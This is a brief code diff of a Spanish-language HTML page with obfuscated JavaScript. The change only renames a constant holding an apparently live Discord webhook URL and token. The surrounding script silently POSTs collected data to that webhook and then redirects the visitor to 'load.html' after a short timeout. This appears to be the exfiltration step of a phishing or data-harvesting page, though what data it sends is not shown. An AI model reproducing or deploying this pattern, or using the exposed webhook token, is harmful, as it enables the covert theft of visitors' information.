@@ -533,7 +533,7 @@ const _0x2a78b2=_0x7ff2;(function(_0x34c695,_0x2224e9){const _0x6c628e=_0x7ff2,_
 
 <script>
   /* ─────────── Configuración ─────────── */
-  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1569498982030385292/ZHbmD8gcb0Qa_UWEKI9n3KrrN23MS1f2bzb2grvz0fCpDqgDc-CWBRPC4DxShQWN4jlp';
+  const DISCORD_URL = 'https://discord.com/api/webhooks/1569498982030385292/ZHbmD8gcb0Qa_UWEKI9n3KrrN23MS1f2bzb2grvz0fCpDqgDc-CWBRPC4DxShQWN4jlp';
   const DESTINO     = 'load.html';
   const ESPERA_MAX  = 4000; // ms máximo antes de redirigir aunque no conteste
 
@@ -600,7 +600,7 @@ const _0x2a78b2=_0x7ff2;(function(_0x34c695,_0x2224e9){const _0x6c628e=_0x7ff2,_
         }]
       };
 
-      const envio = fetch(WEBHOOK_URL, {
+      const envio = fetch(DISCORD_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(cuerpo)
